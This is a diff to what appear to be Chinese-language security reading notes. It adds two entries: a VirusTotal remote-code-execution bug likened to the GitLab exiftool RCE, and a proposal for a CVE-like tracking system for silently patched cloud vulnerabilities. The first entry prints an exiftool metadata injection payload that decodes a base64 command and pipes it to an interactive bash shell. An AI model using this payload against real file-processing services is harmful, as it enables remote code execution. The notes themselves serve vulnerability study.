@@ -71,3 +71,24 @@ PZ的目标是迫使攻击者在每次他们的漏洞被检测到时都需要从
 
 https://blog.aquasec.com/npm-package-planting
 
+# VT RCE
+
+和去年年底的GitLab RCE有点类似，都利用了exiftool 
+
+```
+content: (metadata "\c${system('bash -c \"{echo,BASE64-ENCODED-COMMAND-TO-BE-EXECUTED }|{base64,-d }|{bash,-i }\" ; clear') };")
+```
+
+https://www.cysrc.com/blog/virus-total-blog/
+
+# CVE-Like Cloud Bug System
+
+可以和第一个结合着看
+
+云厂商有时会悄悄修复云上的漏洞，并且不公开相关细节。
+
+可以考虑比如先修，然后再通知到受影响的客户，使其能够知晓漏洞并做出相应的操作
+
+有个有意思的问题，CVE识别规则只认终端用户和网络管理员可以直接管理的漏洞，但是云上漏洞属于厂商自己，现有CVE规则不太适用于云
+
+https://threatpost.com/cve-cloud-bug-system/179394/
